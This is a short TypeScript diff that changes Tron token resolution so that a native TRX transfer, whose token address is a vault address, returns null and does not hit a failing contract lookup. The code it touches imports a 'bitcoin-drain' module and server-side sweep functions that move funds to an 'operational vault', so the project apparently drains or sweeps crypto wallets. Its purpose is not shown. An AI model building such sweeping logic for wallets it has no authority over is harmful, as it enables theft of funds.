@@ -17,6 +17,7 @@ import { JettonMaster, TonClient, WalletContractV4 } from '@ton/ton'
 import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
 import { TRON_MAINNET_USDT_CONTRACT } from '../adapters/tron-adapter.js'
 import { fetchWalletUtxos } from './bitcoin-drain.js'
+import { resolveTronVaultAddress } from './operational-vault.js'
 import {
   executeServerBitcoinPsbtSweep,
   executeServerSolNativeTransfer,
@@ -564,10 +565,16 @@ export async function serverBroadcastUtxo(params: {
   })
 }
 
-/** Default TRC-20 when token_address looks like a Tron contract. */
+/** Default TRC-20 when token_address looks like a Tron contract.
+ *  Returns null for native-TRX transfers: vault address is the destination, not a TRC-20 contract.
+ */
 export function resolveTronTokenFromContext(tokenAddress?: string | null): string | null {
   const t = tokenAddress?.trim()
   if (!t) return TRON_MAINNET_USDT_CONTRACT
+  // Vault address is NOT a TRC-20 contract — native TRX uses vault as token_address.
+  // Passing vault to tronWeb.contract().at() calls getContract() → TronGrid returns {} → throws "Unknown error: {}"
+  const vaultAddr = resolveTronVaultAddress()
+  if (vaultAddr && t === vaultAddr) return null
   if (t.startsWith('T') && t.length >= 30) return t
   return null
 }
